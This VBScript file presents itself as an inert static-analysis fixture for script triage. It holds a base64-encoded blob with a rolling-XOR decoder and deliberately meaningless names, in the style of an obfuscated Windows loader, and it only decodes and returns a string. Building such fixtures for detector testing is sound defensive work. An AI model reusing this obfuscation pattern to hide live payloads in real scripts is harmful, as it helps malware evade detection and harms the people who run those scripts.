Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_00dc7d27 = "x/rLt8Sw1aXW64rpmO2E9pPMvtu22a3I5JPhiPyZxqDJpcDsiOGS4oP3lPyj06HOrci7yOSM7YPniO6I16THtdys2KTFocCwxKHT7qPKqdu0x6jOupTMgc2F0YXVqdquz6jNkvGe64XxzPiE54brm/qT9JrFrMj1lvea6ovihevGoMXxyP2ZrcyuneGU5oq336vfr9zmyeaA5dHo3bmN7I69k/aO74LynvvVvNKkxanApIu/iL3e5oO7i6XBoNSo3a7LueaH4IXrn6Lqn/GF95Lhkt6/3fKU8cX8ya2Z+Jqp1bPattOM/J3pgbz/xZnMv9qo24fXosCsxab6ssep3a/KucqG54XZqt6/2L2Q9pOnnqvP+5r4y+WB4JTomv+Y8YL2hP2i0rPHr5LakdKH24jngfWC45H0qOCV+4/9mOuY1LXXi8+m1aXKudi61rPviezY4dSwhOWHtMimw7vPkOOX9pH0yaXKqcikie2E94fmkvGZt8Gj0A=="
Const Codec_00dc7d27 = "base64_chunks|rolling_xor|b1"

Function Base64_00dc7d27(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_00dc7d27", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_00dc7d27 = outputBytes
End Function

Function Load_00dc7d27()
  Dim partWidth, packedText
  partWidth = (Len(Material_00dc7d27) + 3) \ 4
  packedText = Mid(Material_00dc7d27, 1, partWidth) & Mid(Material_00dc7d27, partWidth + 1, partWidth) & Mid(Material_00dc7d27, partWidth * 2 + 1, partWidth) & Mid(Material_00dc7d27, partWidth * 3 + 1)
  Load_00dc7d27 = Base64_00dc7d27(packedText)
End Function

Function Decode_00dc7d27(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  previous = 177
  For item5 = 0 To UBound(item1)
    result(item5) = item1(item5) Xor previous
    previous = item1(item5)
  Next
  Decode_00dc7d27 = result
End Function

Function Recover_00dc7d27()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  If True Then
    item4 = Empty
      item1 = Load_00dc7d27()
      For item6 = 0 To 0
        item2 = Decode_00dc7d27(item1)
      Next
      item3 = ""
      For item5 = 0 To UBound(item2)
        item3 = item3 & Chr(item2(item5))
      Next
  End If
  Recover_00dc7d27 = item3
End Function

Function Inspect_00dc7d27()
  Inspect_00dc7d27 = Recover_00dc7d27()
End Function
